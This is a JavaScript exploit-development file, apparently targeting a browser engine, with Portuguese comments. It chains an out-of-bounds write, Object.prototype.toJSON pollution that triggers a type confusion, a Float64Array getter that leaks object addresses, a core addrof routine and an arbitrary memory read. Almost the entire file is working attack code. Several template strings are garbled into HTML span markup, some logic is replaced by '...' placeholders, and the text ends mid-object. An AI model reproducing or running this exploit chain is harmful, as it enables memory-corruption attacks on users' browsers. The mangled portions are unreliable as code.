// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R18)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive, 
    clearOOBEnvironment,
    arb_read, 
    arb_write, 
    oob_write_absolute, 
    attemptAddrofUsingCoreHeisenbug // Usará a versão R18 de core_exploit.mjs
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; 
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF]; 

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10; 

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R18() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + CoreExploit Addrof Attempt (R18) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R18...`;

    let iteration_results_summary = [];
    let best_result_for_runner = { /* ... (como na R16) ... */
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_A_result_getter_tc_probe: { success: false, msg: "Addrof (Getter TC Probe R18): Not set.", value: null }, 
        addrof_A_result_core_func: { success: false, msg: "Addrof (CoreExploit Func R18): Not set.", value: null, raw_double: null }, 
        addrof_B_result_direct_prop_tc_probe: { success: false, msg: "Addrof (Direct Prop TC Probe R18): Not set.", value: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `<span class="math-inline">\{FNAME\_CURRENT\_TEST\_BASE\}\_OOB</span>{toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION R18: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 

        const current_object_to_leak_A = { marker_A_R18: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R18: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        
        // Sonda toJSON (para Fase 1 TC) - Lógica como na R16/R17
        function toJSON_TA_Probe_Iter_Closure_R18() { /* ... (lógica interna como na R16/R17, apenas atualizando logs para R18) ... */ 
            probe_call_count_iter++; const call_num=probe_call_count_iter; const ctts=Object.prototype.toString.call(this);
            const is_m2c=(this===marker_M2_ref_iter&&marker_M2_ref_iter!==null&&ctts==='[object Object]');
            logS3(`[PROBE_R18] Call #<span class="math-inline">\{call\_num\}\.'this'\:</span>{ctts}.IsM2C?<span class="math-inline">\{is\_m2c\}\.TCFlag\:</span>{iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R18"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R18",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R18",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R18] Call #<span class="math-inline">\{call\_num\} \(M2C\)\: FIRST TC\. Details obj CREATED\. ID\:</span>{this.marker_id_v82}`,"vuln");}
            if(iteration_final_tc_details_from_probe&&(!this.hasOwnProperty('leaky_A_getter_v82')||iteration_final_tc_details_from_probe.call_number_tc_detected===call_num)){try{Object.defineProperty(this,'leaky_A_getter_v82',{get:function(){const det=iteration_final_tc_details_from_probe;if(det)det.getter_fired=true;if(!victim_typed_array_ref_iter?.buffer){if(det)det.leak_val_getter_int64="getter_victim_null";return"getter_victim_null";}
            let lvf=NaN,lis="getter_err_r18";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R18] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
            return nan?"getter_val_nan_inf":"getter_val_other";}catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}},enumerable:true,configurable:true});if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.getter_defined=true;this.leaky_B_direct_v82=current_object_to_leak_B;if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.direct_prop_set=true;}catch(e_m2d){if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.error_probe=`M2DefErr:${e_m2d.message}`;}}return this;}}catch(e_pm){return{err_pm:call_num,msg:e_pm.message};}return{gen_m:call_num,type:ctts};
        }
        // Fim da sonda

        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_addrof_getter_result = { success: false, msg: "Getter Addrof (TC Probe R18): Default", value: null };
        let iter_addrof_core_result = { success: false, msg: "CoreExploit Addrof (R18): Default", value: null, raw_double: null };
        let iter_addrof_direct_result = { success: false, msg: "Direct Prop (TC Probe R18): Default", value: null };
        let heisenbugConfirmedThisIter = false;
        
        try { 
            // Fase 1 e Fase 2 (lógica como na R17, apenas adaptando nomes de log/variáveis para R18 se necessário)
            // ... (O corpo desta função é substancialmente o mesmo da R17)
            logS3(`  --- Fase 1 (R18): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            const ppKey='toJSON'; let origDesc=Object.getOwnPropertyDescriptor(Object.prototype,ppKey); let polluted=false;
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R18,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R18: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                try{iter_stringify_output_parsed=JSON.parse(iter_raw_stringify_output);}catch(e_p){iter_stringify_output_parsed={err_parse:iter_raw_stringify_output};}
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R18: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
                    const m2s=iteration_final_tc_details_from_probe; iter_addrof_getter_result.value=m2s.leak_val_getter_int64;
                    if(m2s.leak_val_getter_is_ptr){iter_addrof_getter_result.success=true;iter_addrof_getter_result.msg=`Getter Addrof R18: Ptr ${m2s.leak_val_getter_int64}`;}
                    else{iter_addrof_getter_result.msg=`Getter Addrof R18: Val ${m2s.leak_val_getter_int64||'N/A'} not ptr.`;}
                    if(m2s.error_probe&&!iter_primary_error)iter_primary_error=new Error(m2s.error_probe);
                    let m2json=iter_stringify_output_parsed?.payload_M2||iter_stringify_output_parsed;
                    if(m2json&&marker_M2_ref_iter&&m2json.marker_id_v82===marker_M2_ref_iter.marker_id_v82){const vd=m2json.leaky_B_direct_v82;iter_addrof_direct_result.value=vd;if(vd&&current_object_to_leak_B&&vd.marker_B_R18===current_object_to_leak_B.marker_B_R18){iter_addrof_direct_result.success=true;iter_addrof_direct_result.msg=`Direct R18: objB ID confirmed.`;}else{iter_addrof_direct_result.msg=`Direct R18: Not objB ID. Val:${JSON.stringify(vd)}`;}}else{iter_addrof_direct_result.msg="Direct R18: M2 payload not in stringify.";}
                }else{logS3(` TC Probe R18: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
            }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
            logS3(`  --- Fase 1 (R18) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);
            logS3(`  --- Fase 2 (R18): Tentativa de Addrof com attemptAddrofUsingCoreHeisenbug ---`, "subtest");
            try {
                const core_addrof_res = await attemptAddrofUsingCoreHeisenbug(current_object_to_leak_A); // Usa R18
                logS3(`  Addrof Core R18: Resultado: ${JSON.stringify(core_addrof_res)}`, "leak");
                if(core_addrof_res){ /* ... (lógica de análise como na R17, adaptando logs para R18) ... */
                    iter_addrof_core_result.msg=core_addrof_res.message||"Res CoreAddrof R18."; iter_addrof_core_result.raw_double=core_addrof_res.leaked_address_as_double;
                    if(core_addrof_res.leaked_address_as_int64){const la64=core_addrof_res.leaked_address_as_int64;iter_addrof_core_result.value=la64.toString(true);const lhi=la64.high();const nan_inf=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(core_addrof_res.success&&!nan_inf&&(la64.low()!==0||lhi!==0)){iter_addrof_core_result.success=true;logS3(` Addrof Core R18: SUCESSO. Addr:${la64.toString(true)}`,"vuln");try{const dw=await arb_read(la64,4);iter_addrof_core_result.msg+=` ArbRead DWord:${toHex(dw)}.`;logS3(` Addrof Core R18: arb_read(<span class="math-inline">\{la64\.toString\(true\)\},4\)\-\></span>{toHex(dw)}`,"leak");}catch(e_ar){iter_addrof_core_result.msg+=` ArbRead FAIL:${e_ar.message}.`;logS3(` Addrof Core R18: arb_read FAIL:${e_ar.message}`,"error");}}else{iter_addrof_core_result.msg=`Core Addrof R18: TC ${core_addrof_res.success?'OK':'FALHOU'}, val ${la64.toString(true)} NaN/0/inv.`;}}else if(core_addrof_res.success===false){logS3(` Addrof Core R18: Falhou. Msg: ${core_addrof_res.message||'N/A'}`,"warn");}else{iter_addrof_core_result.msg="Core Addrof R18: leaked_address_as_int64 ausente.";}
                }else{iter_addrof_core_result.msg="Core Addrof R18: retornou nulo/inválido.";}
            }catch(e_core_addr){iter_addrof_core_result.msg=`Core Addrof R18: EXCEPTION:${e_core_addr.message}`;if(!iter_primary_error)iter_primary_error=e_core_addr;}
            logS3(`  --- Fase 2 (R18) Concluída. Addrof Core Sucesso: ${iter_addrof_core_result.success} ---`, "subtest");

        }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer;}finally{clearOOBEnvironment({force_clear_even_if_not_setup:true});}

        final_probe_call_count_for_report = probe_call_count_iter;
        let current_iter_summary = { /* ... */ }; 
        iteration_results_summary.push(current_iter_summary);
        // Lógica de best_result_for_runner
        // ... (como na R17, atualizando para nomes R18 e usando iter_addrof_core_result) ...
        const old_s=(best_result_for_runner.addrof_A_result_core_func.success)?3:((best_result_for_runner.addrof_A_result_getter_tc_probe.success||best_result_for_runner.addrof_B_result_direct_prop_tc_probe.success)?2:(best_result_for_runner.heisenbug_on_M2_confirmed_by_probe?1:0));
        const cur_s=(iter_addrof_core_result.success)?3:((iter_addrof_getter_result.success||iter_addrof_direct_result.success)?2:(heisenbugConfirmedThisIter?1:0));
        if(cur_s > old_s || (cur_s > 0 && !best_result_for_runner.oob_value_used)){best_result_for_runner={errorOccurred:iter_primary_error?(iter_primary_error.message||String(iter_primary_error)):null,tc_probe_details:iteration_final_tc_details_from_probe?JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)):null,stringifyResult:iter_stringify_output_parsed,addrof_A_result_getter_tc_probe:iter_addrof_getter_result,addrof_A_result_core_func:iter_addrof_core_result,addrof_B_result_direct_prop_tc_probe:iter_addrof_direct_result,oob_value_used:toHex(current_oob_value),heisenbug_on_M2_confirmed_by_probe:heisenbugConfirmedThisIter};}
        else if(!best_result_for_runner.oob_value_used&&current_oob_value===OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length-1]){best_result_for_runner={errorOccurred:iter_primary_error?(iter_primary_error.message||String(iter_primary_error)):best_result_for_runner.errorOccurred,tc_probe_details:iteration_final_tc_details_from_probe?JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)):null,stringifyResult:iter_stringify_output_parsed,addrof_A_result_getter_tc_probe:iter_addrof_getter_result,addrof_A_result_core_func:iter_addrof_core_result,addrof_B_result_direct_prop_tc_probe:iter_addrof_direct_result,oob_value_used:toHex(current_oob_value),heisenbug_on_M2_confirmed_by_probe:heisenbugConfirmedThisIter};}

        if(iter_addrof_core_result.success)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18: AddrofCore OK!`;
        else if(heisenbugConfirmedThisIter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R18: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R18): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { /* ... (como na R17, atualizando para nomes R18) ... */ 
        errorOccurred:best_result_for_runner.errorOccurred, tc_probe_details:best_result_for_runner.tc_probe_details, 
        stringifyResult:best_result_for_runner.stringifyResult, addrof_A_result:best_result_for_runner.addrof_A_result_core_func, 
        addrof_B_result:best_result_for_runner.addrof_B_result_direct_prop_tc_probe, 
        addrof_A_getter_details:best_result_for_runner.addrof_A_result
